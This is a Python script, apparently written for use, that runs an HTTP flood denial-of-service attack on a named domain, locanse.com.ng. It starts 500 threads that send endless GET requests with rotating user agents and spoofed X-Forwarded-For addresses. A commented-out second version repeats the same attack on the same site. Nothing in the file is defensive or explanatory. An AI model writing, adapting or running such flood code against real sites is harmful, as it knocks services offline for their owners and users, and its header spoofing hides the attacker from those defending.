# pip install requests fake_useragent

import threading
import requests
import random
import time
import socket

# Function to resolve domain to IP
def resolve_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror as e:
        print(f"Could not resolve domain {domain}: {e}")
        return None

# Resolve the target domain
target_domain = "locanse.com.ng"
target_ip = resolve_domain(target_domain)
if not target_ip:
    print("Failed to resolve domain. Exiting.")
    exit(1)

# Target URL
TARGET_URL = f"http://{target_ip}"  # Use the resolved IP address
THREADS = 500  # Number of threads (increase for more intensity)
REQUEST_DELAY = 0.1  # Delay between requests in seconds

# List of user-agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

# Function to send HTTP requests
def http_flood():
    while True:
        try:
            # Spoof headers
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            }
            # Send GET request
            requests.get(TARGET_URL, headers=headers, timeout=5)
            print(f"Request sent to {TARGET_URL} with headers: {headers}")
        except Exception as e:
            print(f"Error: {e}")
        # Add delay to avoid overwhelming the local machine
        time.sleep(REQUEST_DELAY)

# Start the attack
def start_attack():
    for _ in range(THREADS):
        thread = threading.Thread(target=http_flood)
        thread.daemon = True  # Daemonize thread
        thread.start()

    # Keep the main thread alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    print(f"Starting HTTP flood attack on {TARGET_URL} with {THREADS} threads...")
    start_attack()
    

# import threading
# import requests
# import random
# import time
# from fake_useragent import UserAgent

# # Target URL
# TARGET_URL = "https://locanse.com.ng"  # Replace with the target URL
# THREADS = 500  # Number of threads (increase for more intensity)
# REQUEST_DELAY = 0.1  # Delay between requests in seconds

# # Random user-agent generator
# ua = UserAgent()

# # Function to send HTTP requests
# def http_flood():
#     while True:
#         try:
#             # Spoof headers
#             headers = {
#                 "User-Agent": ua.random,
#                 "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
#             }
#             # Send GET request
#             requests.get(TARGET_URL, headers=headers, timeout=5)
#             print(f"Request sent to {TARGET_URL} with headers: {headers}")
#         except Exception as e:
#             print(f"Error: {e}")
#         # Add delay to avoid overwhelming the local machine
#         time.sleep(REQUEST_DELAY)

# # Start the attack
# def start_attack():
#     for _ in range(THREADS):
#         thread = threading.Thread(target=http_flood)
#         thread.daemon = True  # Daemonize thread
#         thread.start()

#     # Keep the main thread alive
#     while True:
#         time.sleep(1)

# if __name__ == "__main__":
#     print(f"Starting HTTP flood attack on {TARGET_URL} with {THREADS} threads...")
#     start_attack()